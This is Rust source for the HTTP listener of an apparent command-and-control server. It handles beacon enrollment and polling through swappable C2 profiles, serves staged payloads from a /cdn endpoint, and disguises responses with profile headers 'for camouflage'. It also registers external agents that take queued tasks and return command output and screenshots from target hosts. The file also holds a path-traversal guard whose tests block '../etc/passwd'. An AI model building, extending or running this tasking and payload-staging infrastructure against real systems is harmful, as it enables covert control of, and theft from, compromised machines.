use crate::state::ServerState;
use axum::body::Bytes;
use axum::extract::{DefaultBodyLimit, State};
use axum::http::HeaderMap;
use axum::http::{HeaderValue, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::{any, get, post};
use prost::Message;
use shikra_proto::v1::CheckInRequest;
use shikra_transport::profile::{C2Profile, ProfileSet};
use std::sync::Arc;

/// Beacon poll bodies must carry full task results (for example multi-megabyte
/// screenshots). Axum's 2 MiB default would reject them with 413 and, without
/// the sequence-window fix, permanently desynchronize the session.
pub const MAX_BEACON_BODY: usize = 32 * 1024 * 1024;

#[derive(Clone)]
pub struct HttpState {
    pub server: Arc<ServerState>,
    /// Live profile set; edits through `SetProfiles` apply on the next request.
    pub profiles: Arc<tokio::sync::RwLock<ProfileSet>>,
    /// Directory served by the `/cdn/{file}` staged-payload endpoint.
    pub hosting_dir: Arc<std::path::PathBuf>,
}

impl HttpState {
    /// Picks the profile whose enroll or poll URI matches the request path,
    /// falling back to the first profile.
    pub async fn profile_for_path(&self, path: &str) -> C2Profile {
        let profiles = self.profiles.read().await;
        let selected = profiles
            .iter()
            .find(|profile| profile.enroll_uri == path || profile.poll_uri == path)
            .or_else(|| profiles.iter().next())
            .cloned();
        selected.expect("profile set is never empty")
    }
}

/// Builds the beacon-facing HTTP listener router.
///
/// Only the fixed canary/CDN routes are registered statically; every other
/// path goes through [`beacon_dispatch`], which consults the live profile set.
/// New enroll/poll URIs therefore take effect without a restart.
pub fn router(
    server: Arc<ServerState>,
    profiles: Arc<tokio::sync::RwLock<ProfileSet>>,
) -> axum::Router {
    let hosting_dir = server.hosting_dir.clone();
    let state = HttpState {
        server,
        profiles,
        hosting_dir,
    };

    axum::Router::new()
        .route("/canary/{token}", get(canary))
        .route("/cdn/{file}", get(hosted_file))
        .route("/api/v1/external/register", post(external_register))
        .route("/api/v1/external/{session}/tasks", get(external_tasks))
        .route("/api/v1/external/{session}/results", post(external_results))
        .fallback(any(beacon_dispatch))
        .layer(DefaultBodyLimit::max(MAX_BEACON_BODY))
        .with_state(state)
}

/// Dispatches beacon requests to enroll or poll based on the live profiles.
async fn beacon_dispatch(
    State(state): State<HttpState>,
    method: axum::http::Method,
    uri: axum::http::Uri,
    body: Bytes,
) -> Response {
    if method != axum::http::Method::POST {
        return status_only(StatusCode::METHOD_NOT_ALLOWED);
    }
    let path = uri.path();
    let (is_enroll, is_poll) = {
        let profiles = state.profiles.read().await;
        let enroll = profiles.iter().any(|profile| profile.enroll_uri == path);
        let poll = profiles.iter().any(|profile| profile.poll_uri == path);
        (enroll, poll)
    };
    if is_enroll {
        return enroll(State(state), uri, body).await;
    }
    if is_poll {
        return poll(State(state), uri, body).await;
    }
    status_only(StatusCode::NOT_FOUND)
}

/// Serves a staged payload from the hosting directory.
///
/// The file name is restricted to a single path component so the endpoint can
/// never be walked out of the hosting directory. Responses reuse the profile's
/// response headers for camouflage.
async fn hosted_file(
    State(state): State<HttpState>,
    axum::extract::Path(file): axum::extract::Path<String>,
) -> Response {
    let Some(name) = safe_file_name(&file) else {
        return status_only(StatusCode::NOT_FOUND);
    };
    let path = state.hosting_dir.join(name);
    match tokio::fs::read(&path).await {
        Ok(bytes) => {
            let profile = {
                let profiles = state.profiles.read().await;
                let first = profiles.iter().next().cloned();
                first.expect("non-empty profile set")
            };
            protobuf_response_bytes(&profile, "application/octet-stream", bytes)
        }
        Err(_) => status_only(StatusCode::NOT_FOUND),
    }
}

fn bearer_token(headers: &HeaderMap) -> Option<&str> {
    headers
        .get(axum::http::header::AUTHORIZATION)?
        .to_str()
        .ok()?
        .strip_prefix("Bearer ")
        .map(str::trim)
}

fn tokens_equal(a: &str, b: &str) -> bool {
    if a.len() != b.len() {
        return false;
    }
    a.bytes()
        .zip(b.bytes())
        .fold(0u8, |acc, (x, y)| acc | (x ^ y))
        == 0
}

fn json_response(status: StatusCode, value: serde_json::Value) -> Response {
    match serde_json::to_vec(&value) {
        Ok(body) => (
            status,
            [(axum::http::header::CONTENT_TYPE, "application/json")],
            body,
        )
            .into_response(),
        Err(_) => status_only(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

async fn external_session_token(state: &HttpState, headers: &HeaderMap, session: &str) -> bool {
    let Some(token) = bearer_token(headers) else {
        return false;
    };
    let expected = state
        .server
        .external_tokens
        .lock()
        .await
        .get(session)
        .cloned();
    expected
        .map(|value| tokens_equal(token, &value))
        .unwrap_or(false)
}

/// Registers a bring-your-own external agent; requires the relay token.
async fn external_register(
    State(state): State<HttpState>,
    headers: HeaderMap,
    body: Bytes,
) -> Response {
    let Some(token) = bearer_token(&headers) else {
        return status_only(StatusCode::UNAUTHORIZED);
    };
    if !tokens_equal(token, &state.server.relay_token) {
        return status_only(StatusCode::UNAUTHORIZED);
    }
    let registration: serde_json::Value = match serde_json::from_slice(&body) {
        Ok(value) => value,
        Err(_) => return status_only(StatusCode::BAD_REQUEST),
    };
    let string_field = |name: &str| {
        registration
            .get(name)
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_string()
    };
    let platform = match string_field("platform").to_ascii_lowercase().as_str() {
        "windows" => shikra_proto::v1::Platform::Windows as i32,
        "linux" => shikra_proto::v1::Platform::Linux as i32,
        "macos" => shikra_proto::v1::Platform::Macos as i32,
        _ => shikra_proto::v1::Platform::Unspecified as i32,
    };
    let architecture = match string_field("architecture").to_ascii_lowercase().as_str() {
        "x86_64" | "x64" => shikra_proto::v1::Architecture::X8664 as i32,
        "aarch64" | "arm64" => shikra_proto::v1::Architecture::Aarch64 as i32,
        _ => shikra_proto::v1::Architecture::Unspecified as i32,
    };
    let external = crate::enrollment::ExternalRegistration {
        hostname: string_field("hostname"),
        username: string_field("username"),
        platform,
        architecture,
        process_name: string_field("process_name"),
    };
    match crate::enrollment::register_external(&state.server, external, String::new()).await {
        Ok((session_id, session_token)) => json_response(
            StatusCode::OK,
            serde_json::json!({
                "session_id": session_id,
                "session_token": session_token,
            }),
        ),
        Err(status) => tonic_status_to_http(status),
    }
}

/// Long-poll style task fetch for an external agent.
async fn external_tasks(
    State(state): State<HttpState>,
    axum::extract::Path(session): axum::extract::Path<String>,
    headers: HeaderMap,
) -> Response {
    if !external_session_token(&state, &headers, &session).await {
        return status_only(StatusCode::UNAUTHORIZED);
    }
    let Some(handle) = state.server.sessions.get(&session).await else {
        return status_only(StatusCode::NOT_FOUND);
    };
    {
        let mut info = handle.info.lock().await;
        info.last_seen = Some(shikra_transport::wire::to_timestamp(
            time::OffsetDateTime::now_utc(),
        ));
    }
    let tasks: Vec<shikra_proto::v1::AgentTask> = {
        let mut queue = handle.beacon_queue.lock().await;
        let take = queue.len().min(16);
        queue.drain(..take).collect()
    };
    let payload: Vec<serde_json::Value> = tasks
        .iter()
        .map(|task| {
            serde_json::json!({
                "task_id": task.task_id,
                "kind": task.kind,
                "args": serde_json::from_slice::<serde_json::Value>(&task.args)
                    .unwrap_or(serde_json::Value::Null),
                "payload_hex": shikra_transport::tls::hex_encode(&task.payload),
            })
        })
        .collect();
    json_response(StatusCode::OK, serde_json::json!({ "tasks": payload }))
}

/// Result submission for an external agent.
async fn external_results(
    State(state): State<HttpState>,
    axum::extract::Path(session): axum::extract::Path<String>,
    headers: HeaderMap,
    body: Bytes,
) -> Response {
    if !external_session_token(&state, &headers, &session).await {
        return status_only(StatusCode::UNAUTHORIZED);
    }
    let Some(handle) = state.server.sessions.get(&session).await else {
        return status_only(StatusCode::NOT_FOUND);
    };
    let results: Vec<serde_json::Value> = match serde_json::from_slice(&body) {
        Ok(value) => value,
        Err(_) => return status_only(StatusCode::BAD_REQUEST),
    };
    for entry in results {
        let task_id = entry
            .get("task_id")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_string();
        if task_id.is_empty() {
            continue;
        }
        let stdout = entry
            .get("stdout_hex")
            .and_then(|value| value.as_str())
            .and_then(|value| shikra_transport::tls::hex_decode(value).ok())
            .unwrap_or_default();
        let stderr = entry
            .get("stderr")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .as_bytes()
            .to_vec();
        let exit_code = entry
            .get("exit_code")
            .and_then(|value| value.as_i64())
            .unwrap_or(-1) as i32;
        let result = shikra_proto::v1::AgentResult {
            task_id: task_id.clone(),
            exit_code,
            stdout,
            stderr,
        };
        if let Some(sender) = handle.pending.lock().await.remove(&task_id) {
            let _ = sender.send(result);
        }
    }
    {
        let mut info = handle.info.lock().await;
        info.last_seen = Some(shikra_transport::wire::to_timestamp(
            time::OffsetDateTime::now_utc(),
        ));
    }
    status_only(StatusCode::NO_CONTENT)
}

/// Returns the sanitized file name, or `None` when the request tries to
/// escape the hosting directory or use a nested path.
pub fn safe_file_name(raw: &str) -> Option<&str> {
    if raw.is_empty() || raw.len() > 128 {
        return None;
    }
    if raw.contains('/') || raw.contains('\\') || raw.contains("..") {
        return None;
    }
    if raw.starts_with('.') {
        return None;
    }
    if !raw
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
    {
        return None;
    }
    Some(raw)
}

/// Canary endpoint: any request is recorded as a trigger and audited.
async fn canary(
    State(state): State<HttpState>,
    axum::extract::Path(token): axum::extract::Path<String>,
) -> Response {
    match shikra_store::repo_team::trigger_canary_by_token(&state.server.pool, &token).await {
        Ok(Some(row)) => {
            let _ = shikra_store::repo::insert_event(
                &state.server.pool,
                "canary_triggered",
                None,
                serde_json::json!({
                    "canary_id": row.id.to_string(),
                    "kind": row.kind,
                    "note": row.note,
                }),
            )
            .await;
            shikra_store::repo_team::audit(
                &state.server.pool,
                "canary",
                "canary_triggered",
                Some(&token),
                serde_json::json!({ "kind": row.kind }),
            )
            .await;
            state.server.trigger_reactions("canary_triggered").await;
            (StatusCode::OK, "ok").into_response()
        }
        Ok(None) => (StatusCode::NOT_FOUND, "not found").into_response(),
        Err(err) => {
            tracing::warn!(%err, "canary trigger failed");
            (StatusCode::INTERNAL_SERVER_ERROR, "error").into_response()
        }
    }
}

async fn enroll(State(state): State<HttpState>, uri: axum::http::Uri, body: Bytes) -> Response {
    let request = match CheckInRequest::decode(body.as_ref()) {
        Ok(request) => request,
        Err(_) => return status_only(StatusCode::BAD_REQUEST),
    };
    let profile = state.profile_for_path(uri.path()).await;
    // HTTP listener has no peer address plumbing; can be added via ConnectInfo later.
    match crate::enrollment::enroll(&state.server, request, String::new()).await {
        Ok(response) => protobuf_response(&profile, response.encode_to_vec()),
        Err(status) => tonic_status_to_http(status),
    }
}

async fn poll(State(state): State<HttpState>, uri: axum::http::Uri, body: Bytes) -> Response {
    let profile = state.profile_for_path(uri.path()).await;
    match crate::enrollment::handle_beacon_poll(&state.server, body.as_ref()).await {
        Ok(bytes) => protobuf_response(&profile, bytes),
        Err(status) => tonic_status_to_http(status),
    }
}

fn protobuf_response(profile: &C2Profile, body: Vec<u8>) -> Response {
    protobuf_response_bytes(profile, "application/octet-stream", body)
}

fn protobuf_response_bytes(profile: &C2Profile, content_type: &str, body: Vec<u8>) -> Response {
    let mut response = (
        StatusCode::OK,
        [(
            axum::http::header::CONTENT_TYPE,
            HeaderValue::from_str(content_type)
                .unwrap_or_else(|_| HeaderValue::from_static("application/octet-stream")),
        )],
        body,
    )
        .into_response();

    for (name, value) in &profile.response_headers {
        if let (Ok(name), Ok(value)) = (
            axum::http::HeaderName::try_from(name.as_str()),
            HeaderValue::try_from(value.as_str()),
        ) {
            response.headers_mut().insert(name, value);
        }
    }
    response
}

fn status_only(code: StatusCode) -> Response {
    (code, ()).into_response()
}

fn tonic_status_to_http(status: tonic::Status) -> Response {
    let code = match status.code() {
        tonic::Code::InvalidArgument => StatusCode::BAD_REQUEST,
        tonic::Code::Unauthenticated => StatusCode::UNAUTHORIZED,
        tonic::Code::PermissionDenied => StatusCode::FORBIDDEN,
        tonic::Code::NotFound => StatusCode::NOT_FOUND,
        tonic::Code::FailedPrecondition => StatusCode::PRECONDITION_FAILED,
        tonic::Code::ResourceExhausted => StatusCode::TOO_MANY_REQUESTS,
        tonic::Code::Unavailable => StatusCode::SERVICE_UNAVAILABLE,
        tonic::Code::DeadlineExceeded => StatusCode::GATEWAY_TIMEOUT,
        _ => StatusCode::INTERNAL_SERVER_ERROR,
    };
    (code, ()).into_response()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_file_name_blocks_traversal() {
        assert_eq!(safe_file_name("stage.bin"), Some("stage.bin"));
        assert_eq!(safe_file_name("a-b_c.1"), Some("a-b_c.1"));
        assert_eq!(safe_file_name("../etc/passwd"), None);
        assert_eq!(safe_file_name("..%2fpasswd"), None);
        assert_eq!(safe_file_name("nested/file"), None);
        assert_eq!(safe_file_name(".hidden"), None);
        assert_eq!(safe_file_name(""), None);
        assert_eq!(safe_file_name("with space"), None);
        let long = "a".repeat(129);
        assert_eq!(safe_file_name(&long), None);
    }

    #[test]
    fn status_mapping_is_reasonable() {
        assert_eq!(
            tonic_status_to_http(tonic::Status::unauthenticated("x")).status(),
            StatusCode::UNAUTHORIZED
        );
        assert_eq!(
            tonic_status_to_http(tonic::Status::not_found("x")).status(),
            StatusCode::NOT_FOUND
        );
    }
}
